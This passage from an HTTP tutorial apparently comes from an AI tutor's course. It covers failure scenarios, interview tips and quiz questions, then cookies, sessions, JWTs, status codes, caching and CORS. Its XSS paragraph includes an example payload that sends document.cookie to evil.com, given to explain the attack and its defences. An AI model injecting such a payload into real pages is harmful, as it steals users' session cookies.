- Compression costs CPU on every dynamic response; at high RPS this is measurable (gzip level 6 is roughly 20–60 MB/s per core, approximate).
- Keep-alive timeouts must be coordinated across every hop or you get phantom connection resets.

**When the simplicity isn't worth it**
- Ultra-low-latency internal RPC at very high volume (Lesson 11 — RPC and gRPC).
- Real-time bidirectional streams: game state, trading feeds, collaborative editing → WebSockets or raw UDP (Lesson 8).

## 11. Failure scenarios

| Failure | What the user experiences | How it's detected | How it recovers |
|---|---|---|---|
| Cookies grow past the 8 KB header limit | Hard `400 Bad Request` on **every** page, permanently, until cookies are cleared; only long-term users affected | Spike in 400s correlated with account age; Nginx `error_log` shows "request header too large" | Stop storing data in cookies; move to a session ID plus server-side store (Lesson 2); emit `Set-Cookie` with `Max-Age=0` to purge the offenders |
| Server closes keep-alive at 60 s, client pool assumes 75 s | Sporadic `ECONNRESET` / "socket hang up" on ~0.1 % of requests, never reproducible locally | Low-rate 502s at the proxy; connection-reset counters in client metrics | Set the client idle timeout **below** the server's (e.g. 50 s vs 60 s); enable retry-on-idempotent-request |
| `Content-Length` does not match the bytes actually written | Truncated JSON → client parse error; or the connection hangs until timeout waiting for missing bytes | Client-side JSON decode errors; p99 latency pinned at exactly the client timeout | Let the framework compute the length; never set it manually. Switch to chunked for generated bodies |
| `Vary: Accept-Encoding` omitted on a cacheable response | Random users receive unreadable binary garbage, or a Hindi page inside an English session | Garbled-content reports; cache hits whose `Content-Encoding` does not match the request | Add `Vary`; purge the CDN cache; set `gzip_vary on` in Nginx |
| Dual framing accepted → request smuggling | A victim's request is hijacked; they see another user's data or get redirected to an attacker site | WAF anomaly rules; unexplained cross-user data in logs; one `X-Request-Id` appearing on two users' traces | Reject dual-framing requests at the edge; run HTTP/2 end-to-end; patch the proxy |
| `X-Forwarded-For` trusted blindly | Rate limits never trigger; abusers are never blocked; geo-blocking bypassed | Rate-limit counters spread thinly across millions of distinct "IPs" | Configure the trusted-proxy hop count; read the right-most untrusted entry |
| Upstream response larger than the proxy's buffers | Slow page; `502` under load as the proxy spills to disk | Nginx warning "upstream response is buffered to a temporary file"; disk I/O spike | Raise `proxy_buffers`, stream with chunked encoding, or paginate the API |
| Request body exceeds `client_max_body_size` | Upload fails with `413 Payload Too Large` and no useful message | 413 rate; support tickets about failed uploads | Raise the limit deliberately, or switch to presigned direct-to-object-storage uploads (Phase 3) |

## 12. Alternatives

| Approach | Wire format | Strengths | Weaknesses | Typical use |
|---|---|---|---|---|
| **HTTP/1.1** | ASCII text | Debuggable, universal, proxy-friendly | Verbose; one in-flight request per connection | Public web, most APIs, internal calls |
| **HTTP/2** | Binary frames + HPACK | Multiplexing, header compression | TCP head-of-line blocking remains; harder to debug | Browser↔CDN, gRPC transport (Lesson 9) |
| **HTTP/3 / QUIC** | Binary over UDP | No TCP HOL blocking, 0-RTT resume, survives IP change | UDP sometimes blocked; newer stacks | Mobile web, video, major CDN edges |
| **gRPC** | Protobuf over HTTP/2 | Compact, typed, streaming, code generation | Not browser-native; binary is harder to debug | Internal service-to-service (Lesson 11) |
| **WebSocket** | Framed, full-duplex after an HTTP upgrade | Server can push; low per-message overhead | Stateful connections complicate load balancing | Chat, live prices, collaborative editing |
| **Server-Sent Events** | An HTTP response that never ends | Dead simple, auto-reconnect, passes through proxies | One-way (server→client), text only | Live order status, notification feeds |
| **Raw TCP protocol** | Whatever you invent | Minimal overhead | No intermediaries, no tooling, you own every bug | Databases (PostgreSQL wire protocol), Redis |
| **UDP-based custom** | Datagrams | Lowest latency, no HOL blocking | You rebuild reliability yourself (Lesson 8) | Games, VoIP, DNS |

## 13. When to use it

1. **Any public-facing API or website.** HTTP passes through every corporate firewall and every mobile carrier NAT; a custom protocol on port 9000 will be blocked somewhere and you will never finish debugging it.
2. **Whenever you want intermediaries to do work for you.** CDN caching, a WAF, an API gateway, request logging, per-route rate limiting — all require a protocol those boxes understand.
3. **Heterogeneous clients.** Browser + iOS + Android + partner integrations + `curl` in a support runbook. HTTP is the only protocol all of them already speak.
4. **Request/response-shaped interactions** where the client asks and waits: fetch a book, place an order, run a search.
5. **Large static content needing caching and resumability.** `Range` requests, `ETag`, and `Cache-Control` make HTTP excellent for files and media.

## 14. When *not* to use it

1. **High-frequency bidirectional real-time data.** A trading feed pushing 500 updates/second to 50,000 clients over HTTP polling is absurd — over half the bytes would be headers and each update costs a full RTT. Use WebSockets or a UDP-based protocol.
2. **Server-initiated events.** HTTP's client-initiates rule means the server cannot say "your order shipped." Long polling emulates this badly; SSE or WebSockets do it properly (Lesson 13).
3. **Extremely chatty internal RPC where microseconds matter.** Parsing text headers for a 20-byte payload at 200,000 RPS wastes real CPU; gRPC or a binary protocol is the right tool (Lesson 11).
4. **Bulk transfer between known endpoints inside a trusted network.** Copying 10 TB between data centres is better served by a dedicated transfer tool than by HTTP semantics you never use.
5. **Hard real-time where a late packet is worthless.** Live voice does not want retransmission; it wants the *next* sample (Lesson 8 — TCP versus UDP).

## 15. Common mistakes

**Beginner mistakes**
- Assuming one `recv()` returns one complete request. TCP is a stream; loop until `\r\n\r\n`, then read exactly `Content-Length` bytes.
- Forgetting the blank line between headers and body, then wondering why the client hangs forever.
- Omitting or hardcoding `Host`, then being confused when virtual hosting routes you to the wrong site.
- Piling state into cookies until headers exceed 8 KB and every request 400s.
- Setting `Content-Length` by hand and getting it wrong by one byte — hang or truncation.
- Logging full request headers, thereby writing session cookies and `Authorization` tokens into the log store in plaintext.
- Creating a new HTTP client/connection per request in server code, paying a handshake every time.

**Experienced-engineer mistakes**
- Trusting the left-most `X-Forwarded-For` entry, silently making every IP-based control forgeable.
- Forgetting `Vary` on a negotiated response, poisoning the CDN cache for a slice of users.
- Mismatched keep-alive timeouts across browser → CDN → LB → app, producing a permanent background rate of unexplained 502s.
- Compressing already-compressed media, burning CPU for ~0 % gain, then concluding "gzip is slow".
- Allowing an HTTP/2 → HTTP/1.1 downgrade at a proxy without strict request validation, reopening smuggling.
- Treating headers as free and shipping 2 KB of tracing/baggage headers on every internal call; at 100k RPS that is ~200 MB/s of pure overhead.
- Buffering a 2 GB export in memory just to compute `Content-Length` instead of streaming it chunked, and OOM-ing the pod.

## 16. Interview perspective

HTTP almost never appears as "explain HTTP". It appears as the substrate of answers about caching, APIs, gateways, and latency.

- **Be able to write a request by hand.** If asked "what does the browser actually send?", name the four parts — request line, headers, blank line, body — and call out `Host` as mandatory. Very few candidates can.
- **Connect header overhead to a real decision.** "Our internal calls have 900-byte payloads and 1 KB of headers, so HPACK in HTTP/2 or moving to gRPC is worth more than any compression tuning." That is a quantified argument, which is what gets you levelled up.
- **Bring up connection reuse unprompted** when discussing latency: "Is this client pooling connections? At 60 ms RTT a fresh TLS connection costs 120 ms before the first byte."
- **Know the framing question.** "How does the receiver know the body ended?" leads naturally to `Content-Length` vs chunked, and then to streaming large exports.
- **Mention `X-Forwarded-For` correctly** the moment you draw a load balancer: "the app needs a trusted-hop count, otherwise rate limiting is forgeable."
- **Separate protocol from semantics.** "HTTP/2 doesn't change methods or status codes; it changes how the bytes are framed." That shows you know what Lesson 9 is really about.

**Red flags interviewers watch for**
- Cannot name a single header other than `Content-Type`.
- Believes HTTPS is "a different protocol from HTTP" rather than HTTP carried over TLS (Lesson 7).
- Thinks GET requests cannot have a body, or that POST is "the secure one".
- Adds a CDN or proxy to the diagram but cannot say what the client IP looks like afterwards.
- Proposes polling an endpoint every second for real-time updates without acknowledging the overhead or mentioning SSE/WebSockets.
- Says "just gzip everything", including images and 200-byte responses.
- Cannot explain where a response body ends.

## 17. Knowledge check

**Conceptual**

1. A server receives a request containing both `Content-Length: 50` and `Transfer-Encoding: chunked`. Explain which one the specification says wins, why having both is dangerous when a CDN sits in front of the app, and what the app should do instead of simply picking one.
2. BookNook puts a CDN in front of its load balancer. An engineer reports that the API sometimes returns gzip-compressed bytes to a client that sent no `Accept-Encoding` header at all. Name the specific missing response header that most likely caused this, and describe exactly which users would be affected and which would not.
3. Explain why HTTP/1.1 browsers open six connections per hostname, what problem that works around, and what that workaround costs in server resources and handshakes.

**Practical scenario**

4. BookNook adds a "download my order history" feature producing a CSV of up to 400 MB for heavy users. The current implementation builds the whole string in memory, sets `Content-Length`, and returns it. Pods start OOM-killing under load, and users on slow connections see truncated files. Redesign the response: state which framing you use, which headers you send, what the client sees while waiting, and name one new failure mode your redesign introduces that the old one did not have.

**Calculation**

5. BookNook's internal recommendation service receives 120,000 requests per second from other services. Each request carries 1,150 bytes of headers (tracing, auth, baggage) plus a 240-byte JSON body. Each response carries 400 bytes of headers plus a 1,100-byte body.
   (a) What is the total bytes/second on the wire, and what percentage of it is headers?
   (b) If moving to HTTP/2 compresses *header* bytes by 88 %, how many bytes/second and how many gigabytes/day do you save?
   (c) If internal egress is billed at ₹0.80 per GB, what is the annual saving? Show every step and state every assumption you add.

Reply with your answers and I'll assess them, correct anything shaky, and give model answers before Lesson 6.

---

**Progress checklist**

Phase 1:
- `[x] 1. Client-server architecture`
- `[x] 2. Stateful versus stateless servers`
- `[x] 3. IP addresses, ports, sockets, domain names`
- `[x] 4. DNS resolution and DNS caching`
- `[x] 5. HTTP requests and responses`
- `[ ] 6. HTTP methods, headers, cookies, sessions, status codes`
- `[ ] 7. HTTPS and TLS`
- `[ ] 8. TCP versus UDP`
- `[ ] 9. HTTP/1.1 vs HTTP/2 vs HTTP/3`
- `[ ] 10. REST APIs`
- `[ ] 11. RPC and gRPC`
- `[ ] 12. GraphQL`
- `[ ] 13. Synchronous versus asynchronous communication`
- `[ ] 14. Latency, throughput, bandwidth, concurrency`
- `[ ] 15. Availability, reliability, durability, fault tolerance`
- `[ ] 16. Average latency vs p50/p95/p99, tail latency`
- `[ ] 17. Idempotency, retries, timeouts, exponential backoff`

**NEXT LESSON: Phase 1, Topic 6 — HTTP methods, headers, cookies, sessions, and status codes**

---

# Lesson 6 — HTTP Methods, Headers, Cookies, Sessions, and Status Codes

*Phase 1, Topic 6*

## 1. Simple definition

Lesson 5 gave you the *envelope*. This lesson gives you the *vocabulary* written on it.

- An **HTTP method** (also called a *verb*) is the word at the start of the request line that says what you want done to the resource: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS`.
- A **status code** is the three-digit number in the response's status line that says how it went: `200`, `404`, `503`.
- A **cookie** is a small named string the server asks the browser to store and send back on every subsequent request to that site. It is the mechanism that makes a stateless protocol feel like a logged-in session.
- A **session** is the server's notion of "this sequence of requests belongs to the same logged-in user" (Lesson 2 — stateful versus stateless servers).
- **Caching headers** (`Cache-Control`, `ETag`) let the client and intermediaries avoid asking again.
- **CORS** (Cross-Origin Resource Sharing) is a browser-enforced rule set deciding whether JavaScript on site A may read a response from site B.

Everything in this lesson is *semantics layered on the format from Lesson 5*. The bytes do not change; the agreed meaning does.

## 2. Why it exists

Imagine HTTP with one verb and one outcome code. Three things break immediately.

1. **Intermediaries cannot help.** A cache must know "this request only reads" to be allowed to serve it from cache. If every request were `POST /do`, no CDN could cache anything, and the entire Phase 2 caching toolkit would be unavailable.
2. **Retries become unsafe.** A network blip means the client does not know whether its request arrived (Lesson 1's ambiguity problem). If the method is declared *idempotent*, retrying is safe. If it is `POST`, retrying may charge the card twice. The method is a **machine-readable contract about retry safety**.
3. **Clients cannot react correctly.** "Something went wrong" is useless. `401` means *re-authenticate*, `429` means *slow down and retry later*, `404` means *stop retrying forever*, `503` means *retry with backoff*. The status code is a **machine-readable instruction to the client**.

Cookies exist for a different reason. HTTP is stateless by design (Lesson 2), yet almost every useful site needs to know who you are. Cookies were the minimal addition that solved this: a server-set, browser-stored, automatically-replayed token. Their automatic replay is exactly what makes them convenient and exactly what makes CSRF possible (§4.7).

CORS exists because the browser's **same-origin policy** — "JavaScript from one site may not read another site's data" — is the thing preventing a malicious page from reading your bank balance. CORS is the controlled, explicit relaxation of that rule.

## 3. Real-world analogy

A **hospital reception desk with a filing system**.

- **Methods** are the standard request forms: "view my record" (`GET`), "register me as a new patient" (`POST`), "replace my address form entirely" (`PUT`), "change just my phone number" (`PATCH`), "delete my record" (`DELETE`), "is there a record, and how big?" (`HEAD`), "what am I even allowed to ask for here?" (`OPTIONS`).
- **Status codes** are the stamps the clerk puts on your form: *Done* (200), *Created, here's your file number* (201), *Go to building B* (301/302), *Nothing changed since you last asked* (304), *Your form is filled in wrong* (400), *Show me your ID* (401), *You have ID but you're not allowed in this ward* (403), *No such patient* (404), *Too many requests, take a seat* (429), *Our system crashed* (500).
- A **cookie** is the numbered wristband they put on you. You didn't choose the number; you show it automatically every time you approach any desk in the hospital.
- A **session** is the file the hospital keeps keyed by that wristband number. The wristband holds no medical data — the filing cabinet does.
- A **JWT** is the opposite design: instead of a wristband number, you carry a *signed, tamper-evident card* that states your name, ward, and expiry. The clerk verifies the signature rather than opening a cabinet.
- **CORS** is the rule that a *different* hospital's courier cannot walk in and read your file just because they know your wristband number — unless your hospital has explicitly listed them as an approved partner.

**Where the analogy breaks down**

| Hospital desk | Real HTTP |
|---|---|
| The clerk remembers you walked up two minutes ago | The server remembers nothing; the wristband must be presented every single time, on all 60 requests of a page |
| Forms are processed in order, one at a time | Dozens of requests are in flight concurrently; a `PUT` and a `GET` for the same record can race |
| A stamped form is proof the work happened | A lost `201 Created` response does not mean the record wasn't created — it was. Retrying creates a duplicate (Lesson 17) |
| The wristband can only be read inside the hospital | Cookies are sent to *any* page on the domain, including one an attacker tricked you into loading — that is CSRF |
| The clerk can refuse a forged wristband by looking at you | The server has no way to tell a stolen cookie from a legitimate one; that is why `Secure`, `HttpOnly`, and short expiry exist |
| Rules are enforced by the clerk | **CORS is enforced by the browser, not the server.** `curl` ignores it completely. CORS is not a server-side security control |

That last row is the single most misunderstood thing in this lesson.

## 4. Detailed technical explanation

### 4.1 Safe and idempotent methods

Two properties, constantly confused. Define both precisely:

- **Safe**: the request is *read-only*. It does not change server state that the client cares about. (Logging and analytics counters don't count.)
- **Idempotent**: performing the request **N times has the same effect on server state as performing it once**. Note this says nothing about the *response* being identical — a second `DELETE` may return `404` instead of `204`, and that is still idempotent because the *state* is the same.

| Method | Safe | Idempotent | Has a request body | Cacheable | Meaning |
|---|---|---|---|---|---|
| `GET` | ✅ Yes | ✅ Yes | Technically allowed, effectively never used | ✅ Yes | Retrieve a representation |
| `HEAD` | ✅ Yes | ✅ Yes | No | ✅ Yes | Like `GET` but headers only, no body |
| `OPTIONS` | ✅ Yes | ✅ Yes | Rarely | ❌ No | Ask what's permitted (used by CORS preflight) |
| `POST` | ❌ No | ❌ **No** | ✅ Yes | Only with explicit freshness headers (rare) | Create a subordinate resource, or "process this" |
| `PUT` | ❌ No | ✅ Yes | ✅ Yes | ❌ No | Replace the resource at this exact URL, wholesale |
| `PATCH` | ❌ No | ❌ Not inherently | ✅ Yes | ❌ No | Apply a partial modification |
| `DELETE` | ❌ No | ✅ Yes | Rarely | ❌ No | Remove the resource at this URL |

Why each classification matters in practice:

- **`PUT` is idempotent** because it carries the *complete desired final state*: `PUT /users/42 {"name":"Ada","city":"Pune"}` sent five times leaves exactly the same row. Safe to retry blindly.
- **`PATCH` is not inherently idempotent** because it carries a *delta*. `PATCH /users/42 {"op":"increment","field":"credits","by":10}` run five times adds 50 credits. But a *replacement-style* patch (`{"city":"Pune"}`) **is** idempotent. So the honest answer is: PATCH's idempotency depends on **the patch document's semantics — delta operations are not idempotent, field-assignment operations are**. Document which one your API uses.
- **`POST` is not idempotent** because `POST /orders` creates a *new* order each time. This is the entire reason `Idempotency-Key` exists (Lesson 17 — idempotency, retries, timeouts, exponential backoff).
- **`DELETE` is idempotent** even though the second call "fails": after call 1 and after call 5 the resource is equally gone.

**The practical payoff:** HTTP clients, load balancers, and service meshes **automatically retry idempotent methods** on connection failure and will *not* retry `POST`. Nginx's `proxy_next_upstream` defaults exclude non-idempotent requests for exactly this reason. If you implement a state-changing operation as `GET /deleteUser?id=42`, a web crawler, a browser prefetcher, or a link-preview bot will eventually delete your users. This has happened to real companies.

### 4.2 Status code families

| Family | Name | Means | Client should |
|---|---|---|---|
| `1xx` | Informational | "Still going" (`100 Continue`, `101 Switching Protocols`) | Keep waiting |
| `2xx` | Success | It worked | Proceed |
| `3xx` | Redirection | Look elsewhere, or use your cache | Follow or reuse |
| `4xx` | Client error | *You* made a mistake | **Do not blindly retry** — fix the request |
| `5xx` | Server error | *We* made a mistake | Retry with backoff (if idempotent) |

The 4xx/5xx split is the most important dichotomy in operations: **4xx rates measure client/integration quality; 5xx rates measure your reliability.** Your SLO alarms (Lesson 15 — availability, reliability, durability, fault tolerance) should fire on 5xx, not 4xx, or every scanner bot will page you at 3 a.m.

### 4.3 The eighteen codes that actually matter

**Success**

| Code | Name | Use it when |
|---|---|---|
| `200 OK` | OK | A successful `GET`, or a successful `POST`/`PUT` that returns the updated body |
| `201 Created` | Created | A `POST` created a new resource. **Must** include a `Location: /orders/9f3b` header pointing at it |
| `202 Accepted` | Accepted | You queued the work and it is *not done yet*. Return a status URL. This is the honest code for async jobs (Lesson 13) |
| `204 No Content` | No Content | Success with deliberately no body — a `DELETE`, or a `PUT` where echoing the body is wasteful. Must have no body at all |

**Redirection**

| Code | Name | Use it when |
|---|---|---|
| `301 Moved Permanently` | Permanent | The URL changed forever. Browsers and search engines **cache this aggressively and may never ask again** — a wrong 301 is extremely hard to undo |
| `302 Found` | Temporary | Temporary relocation. Historically clients wrongly rewrote `POST` → `GET` on 302, which is why 307 exists |
| `304 Not Modified` | Not Modified | Response to a conditional request whose validator matched. **No body.** Saves the whole payload (§4.8) |
| `307 Temporary Redirect` | Temporary, method-preserving | Same as 302 but the method and body **must** be preserved. Use this, not 302, for redirecting `POST`. (`308` is the permanent, method-preserving twin) |

**Client errors**

| Code | Name | Use it when |
|---|---|---|
| `400 Bad Request` | Bad Request | The request is malformed: bad JSON, missing `Host`, oversized headers. The client cannot fix it by retrying identically |
| `401 Unauthorized` | Actually "Unauthenticated" | We do not know who you are. **Must** include `WWW-Authenticate`. Credentials are missing, expired, or invalid |
| `403 Forbidden` | Forbidden | We know exactly who you are, and you still may not do this. Re-authenticating will not help |
| `404 Not Found` | Not Found | No such resource. Also used deliberately to hide existence from unauthorised users |
| `409 Conflict` | Conflict | The request conflicts with current state: duplicate email on signup, optimistic-lock version mismatch, "cart already checked out" |
| `410 Gone` | Gone | It existed and was intentionally, permanently removed. Stronger than 404; tells crawlers to drop the URL |
| `422 Unprocessable Content` | Semantically invalid | The JSON parsed fine but is business-invalid: `"quantity": -3`, an ISBN that fails checksum. (Pragmatically many APIs just use 400; pick one and be consistent) |
| `429 Too Many Requests` | Rate limited | You exceeded a quota. **Must** include `Retry-After: 30`. Pair with `RateLimit-*` headers if you can |

**Server errors**

| Code | Name | Use it when |
|---|---|---|
| `500 Internal Server Error` | Server error | Unhandled exception. Means "our bug". Never leak stack traces in the body |
| `502 Bad Gateway` | Bad Gateway | A proxy got an invalid/no response from upstream. Usually: your app crashed or closed the connection; the LB is reporting it |
| `503 Service Unavailable` | Unavailable | Temporarily down or deliberately shedding load. Include `Retry-After`. This is the *correct* code for "overloaded" and for maintenance |
| `504 Gateway Timeout` | Gateway Timeout | A proxy waited longer than its timeout for upstream. Usually a slow database or a missing timeout deeper in the stack |

**The 502 vs 503 vs 504 triage table — memorise this, it is an on-call superpower:**

```
502  upstream answered with garbage / closed the connection  -> app crashed, bad deploy, OOM kill
503  the proxy or app says "I am deliberately not serving"    -> overload, no healthy upstream, maintenance
504  upstream did not answer in time                         -> slow dependency, deadlock, missing timeout
```

### 4.4 `401` versus `403`, stated unambiguously

The names are historically wrong, which is why everyone confuses them.

- **`401 Unauthorized` really means *unauthenticated*.** "I don't know who you are." Trigger: no token, expired token, malformed token, bad signature. The correct client reaction is **obtain credentials and retry** — refresh the token, or show a login page.
- **`403 Forbidden` means *authenticated but unauthorised*.** "I know you're user 42, and user 42 may not delete other people's reviews." The correct client reaction is **stop; do not retry; show a permission error**. Showing a login page here is a bug and an infinite-loop generator.

The decision procedure:

```
Can the server identify the caller from the credentials presented?
   NO  -> 401  (and send WWW-Authenticate)
   YES -> Is this identity permitted to perform this action on this resource?
            NO  -> 403   (or 404 if even the existence is secret)
            YES -> proceed
```

The 404-instead-of-403 variant matters: if `GET /orders/9f3b` returns 403, an attacker learns order `9f3b` exists. For resources where existence is sensitive, return `404`. This is a deliberate, documented trade-off between debuggability and information leakage.

### 4.5 Cookies and their attributes

A server sets a cookie with a response header:

```
Set-Cookie: session=7f3a9c21b4e8; Max-Age=1209600; Path=/; Domain=booknook.com; Secure; HttpOnly; SameSite=Lax
```

The browser then automatically sends it back on matching requests:

```
Cookie: session=7f3a9c21b4e8; ab_test=variant_b
```

Note the asymmetry: `Set-Cookie` is one cookie per header with attributes; `Cookie` is a bare semicolon-separated list of name=value with **no attributes at all**. The server cannot see whether the cookie it received was `Secure` — it only knows the value.

| Attribute | What it does | Why you want it |
|---|---|---|
| `Secure` | Browser sends the cookie **only over HTTPS** | Without it, a single plain-HTTP request (an old bookmark, a `http://` image) leaks the session token to anyone on the network |
| `HttpOnly` | JavaScript cannot read it via `document.cookie` | Turns a successful XSS from "instant full account takeover" into "attacker must act through the victim's browser". Essential |
| `SameSite=Strict` | Never sent on any cross-site request | Strongest CSRF defence, but breaks the "click a link in an email → arrive logged in" flow |
| `SameSite=Lax` | Sent on top-level **navigations** using safe methods (`GET`), not on cross-site `POST`, iframes, or `fetch` | The modern browser default. Good CSRF protection with usable UX |
| `SameSite=None` | Sent on all cross-site requests; **requires `Secure`** | Needed for genuine third-party embeds (payment widgets, SSO iframes) |
| `Domain=booknook.com` | Also sent to **sub**domains (`api.booknook.com`, `blog.booknook.com`) | Convenient — and dangerous: a compromised `blog.` subdomain now receives your session cookie. Omit `Domain` to get a *host-only* cookie, which is the safer default |
| `Path=/api` | Only sent for URLs under that path | Weak isolation; **not** a security boundary (any page can set cookies at any path) |
| `Max-Age=1209600` / `Expires` | Lifetime in seconds (`Max-Age` wins if both given) | Omit both → a *session cookie*, deleted when the browser closes. `Max-Age=0` deletes immediately |
| `__Host-` name prefix | Browser enforces `Secure`, `Path=/`, and **no** `Domain` | A free, strong hardening measure: `Set-Cookie: __Host-session=...` |

Hard limits (typical, approximate, browser-dependent): **~4 KB per cookie**, **~50 cookies per domain**, **~180 KB total per browser**. And remember §4.7 of Lesson 5 — cookies are replayed on *every* request, so a 3 KB cookie on a page with 60 requests costs 180 KB of upload per page view.

### 4.6 Server-side sessions versus JWTs

Lesson 2 established the core trade-off: state in the server (fast to revoke, requires shared storage) versus state in the token (no lookup, hard to revoke). Here is the HTTP-level detail.

**Server-side session**

```
Set-Cookie: __Host-session=7f3a9c21b4e8; Secure; HttpOnly; SameSite=Lax; Max-Age=1209600
```

The cookie value is an **opaque random identifier** — at least 128 bits of cryptographically secure randomness. It means nothing by itself. The server looks it up in Redis or Postgres to find `{user_id: 42, roles: ["customer"], created_at: ...}`.

- Size on the wire: ~40 bytes per request.
- Revocation: delete one key. Instant, global, complete.
- Cost: **one datastore lookup per request** — typically 0.3–1 ms against Redis, plus the operational burden of running that store (Phase 2, Topic 9 — distributed caching).

**JWT (JSON Web Token)**

```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsImV4cCI6MTc2MDAwMDAwMH0.k3Vb...
```

Three base64url segments — header, claims, signature — joined by dots. The server **verifies the signature** (sub-millisecond, pure CPU, no I/O) and trusts the claims inside.

- Size on the wire: **400–1,500 bytes per request**, 10–35× larger than a session ID.
- Revocation: **you cannot**, not without adding a denylist — which reintroduces the lookup you were trying to avoid. A stolen JWT is valid until `exp`.
- Mitigation: short-lived access tokens (5–15 min) plus a long-lived refresh token that *is* checked against a database on each refresh. This is the standard production pattern and it is a hybrid, not pure JWT.

| | Server-side session | JWT |
|---|---|---|
| Bytes per request | ~40 | 400–1,500 |
| Lookup per request | 1 (Redis, ~0.5 ms) | 0 (signature verify, ~0.05 ms) |
| Instant revocation | Yes | No (needs a denylist) |
| Works across independent services without shared state | No | Yes |
| Leaks claims to anyone holding it | No (opaque) | Yes (claims are base64, **not encrypted**) |
| Natural fit | Monolith / single org / browser apps | Service-to-service, federated identity, mobile |

A fact that surprises people: **JWT payloads are encoded, not encrypted.** Anyone with the token can read every claim. Never put anything confidential in a JWT.

A common security hole: accepting the token's own `alg` header, which historically allowed `alg: none` or an RS256→HS256 downgrade. **Always pin the expected algorithm server-side.**

### 4.7 XSS and CSRF, one paragraph each

**XSS (Cross-Site Scripting)** is when attacker-supplied content is rendered into your page as *executable code* rather than inert text — for example a BookNook review body containing `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`. Because that script runs *on your origin*, it inherits all the victim's privileges: it can read non-`HttpOnly` cookies and `localStorage`, read any page the user can read, and issue authenticated requests that look perfectly legitimate — CSRF tokens included. XSS therefore defeats almost every other client-side defence, which is why it is ranked so highly in every security list. Defences, in order of value: **contextual output encoding** (let your template engine escape by default; never build HTML by string concatenation), a strict **Content-Security-Policy** that forbids inline scripts and restricts script sources, `HttpOnly` on session cookies so at least the raw token cannot be exfiltrated, and sanitising rich-text input with a vetted allowlist library rather than a homemade regex.

**CSRF (Cross-Site Request Forgery)** exploits the fact that browsers attach cookies to requests **automatically, based on the destination, with no regard for who initiated them**. If a logged-in BookNook user visits `evil.com`, that page can silently submit a form to `https://booknook.com/api/orders` or `/account/email` — and the browser helpfully includes the session cookie, so the server sees a perfectly authenticated request the user never intended. Note the attacker cannot *read* the response (same-origin policy stops that), so CSRF is a write-side attack: change the email, transfer the money, place the order. Defences: **`SameSite=Lax` or `Strict` cookies** (now the browser default, and the single biggest win), **anti-CSRF tokens** — a random per-session value placed in a hidden form field or custom header and compared server-side, since `evil.com` cannot read it — checking the `Origin`/`Referer` header on state-changing requests, and never using `GET` for anything that mutates state. Note that token-in-`Authorization`-header auth (JWT in a header, not a cookie) is structurally immune to CSRF, because nothing is sent automatically — but it is more exposed to XSS, since the token must live somewhere JavaScript can reach. **The two attacks pull your design in opposite directions; that is the real trade-off.**

### 4.8 `Cache-Control`, `ETag`, and conditional requests

Caching is the highest-leverage performance tool in all of system design (Phase 2, Topics 8–10). HTTP's caching model has two independent halves.

**Half 1 — freshness: "can I use my copy without asking?"**

```
Cache-Control: public, max-age=300, s-maxage=600, stale-while-revalidate=60
```

| Directive | Meaning |
|---|---|
| `max-age=300` | Fresh for 300 s in *any* cache; serve from cache with no network call |
| `s-maxage=600` | Overrides `max-age` for **shared** caches (CDN, proxy) only |
| `public` | Shared caches may store it |
| `private` | Only the end user's browser may store it. **Use for anything user-specific** |
| `no-cache` | Store it, but **always revalidate** before use. (Not "don't cache" — that's the trap) |
| `no-store` | Never write it to disk or memory anywhere. For genuinely sensitive responses |
| `must-revalidate` | Once stale, never serve it; you must revalidate |
| `immutable` | This URL's bytes will never change — don't even revalidate. Use with content-hashed filenames |
| `stale-while-revalidate=60` | Serve the stale copy instantly and refresh in the background. Excellent UX lever |

**Half 2 — validation: "my copy is stale; is it still correct?"**

The server attaches a **validator**:

- `ETag: "a3f1c9"` — an opaque fingerprint of this exact representation. `W/"a3f1c9"` is a **weak** ETag meaning "semantically equivalent" rather than byte-identical.
- `Last-Modified: Wed, 08 Oct 2026 17:11:04 GMT` — one-second resolution, so it cannot distinguish two edits within the same second. ETags are strictly better.

The client then sends a **conditional request**:

```
GET /books/1492052205 HTTP/1.1
If-None-Match: "a3f1c9"          <- "only send the body if the ETag differs"
```

and gets either:

```
HTTP/1.1 304 Not Modified         <- ~250 bytes, NO body
ETag: "a3f1c9"
Cache-Control: max-age=300
```

or a full `200` with a new ETag.

The companion header `If-Match` powers **optimistic concurrency control** on writes:

```
PUT /books/1492052205 HTTP/1.1
If-Match: "a3f1c9"               <- "only apply this if nobody else edited since I read"
```

If someone else changed it, the server returns **`412 Precondition Failed`** and your update is safely rejected instead of silently clobbering theirs. This is the HTTP-level version of the optimistic locking you will meet again in Phase 3 (database concurrency).

**Important:** `304` still costs a full round trip. It saves **bandwidth**, not **latency**. Only a fresh `max-age` hit saves latency, because it skips the network entirely. Engineers conflate these constantly.

### 4.9 CORS, explained properly

Start with the rule CORS relaxes. The **same-origin policy** says JavaScript running on origin A may *send* requests to origin B but may **not read the response** unless B explicitly permits it. An **origin** is the triple `(scheme, host, port)`. So `https://booknook.com` and `https://api.booknook.com` are *different* origins — different host. So are `http://` and `https://` of the same host, and `:443` vs `:8080`.

Without this policy, any page you visit could `fetch('https://yourbank.com/accounts')` with your cookies attached and read the result. The policy is what makes browsing untrusted sites survivable.

**Simple requests.** If the request is a `GET`, `HEAD`, or `POST` with only "CORS-safelisted" headers and a `Content-Type` of `text/plain`, `multipart/form-data`, or `application/x-www-form-urlencoded`, the browser just sends it and then checks the response:

```
GET /api/books HTTP/1.1
Host: api.booknook.com
Origin: https://booknook.com          <- browser adds this automatically; JS cannot forge it
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://booknook.com
```

If `Access-Control-Allow-Origin` is absent or doesn't match, **the request still reached the server and still executed** — the browser simply refuses to hand the response to the JavaScript. This is why CORS is not a server-side security control.

**Preflight.** Anything else — a `PUT`/`DELETE`/`PATCH`, `Content-Type: application/json`, or a custom header like `X-Request-Id` or `Authorization` — triggers an extra `OPTIONS` request **before** the real one:

```
OPTIONS /api/orders HTTP/1.1
Host: api.booknook.com
Origin: https://booknook.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
```

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://booknook.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400          <- cache this preflight for 24h
